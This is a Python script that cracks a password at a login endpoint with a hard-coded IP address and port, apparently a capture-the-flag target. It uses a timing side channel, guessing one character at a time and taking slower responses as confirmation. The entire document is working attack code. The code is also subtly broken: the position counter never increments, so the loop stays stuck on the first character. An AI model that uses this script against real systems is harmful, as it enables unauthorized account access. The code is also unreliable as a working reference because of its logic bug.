import requests
import string
import time

# The URL of the login endpoint
url = 'http://34.31.154.223:51749/'

# The characters to use in the brute force attack
charset = string.ascii_letters + string.digits

# Function to test a password and get the response
def test_password(password):
    try:
        start = time.time()
        response = requests.post(url, data={'password': password})
        elapsed_time = time.time() - start
        return response.text, elapsed_time
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return "", 0

# Function to perform the brute force attack
def brute_force():
    # kBySlaY
    tmp = ["a"] * 7
    sleep_time = 1
    i = 0
    while i <= 6:
        print(f"Brute forcing position {i + 1}")
        for char in charset:
            tmp[i] = char
            curr = ''.join(tmp)
            print(f"Testing password: {curr}")

            response, timer = test_password(curr)
            print(f"Time: {timer}")

            if "yayy! hi kirby" in response:
                print(f"Password found: {curr}")
                return curr

            # If the response time exceeds the threshold, consider the character correct
            if timer > sleep_time:  # Adjust this threshold based on server behavior
                print(f"Character at position {i + 1} confirmed: {char}")
                sleep_time += 1
                break

        tmp[i] = char  # Update the confirmed character for the current position
        print(f"Character at position {i + 1} confirmed: {tmp[i]}, tmp = {''.join(tmp)}")
    
    print('Password not found')
    return None

if __name__ == '__main__':
    found_password = brute_force()
    if found_password:
        print(f'Cracked password: {found_password}')
    else:
        print('Failed to crack the password')
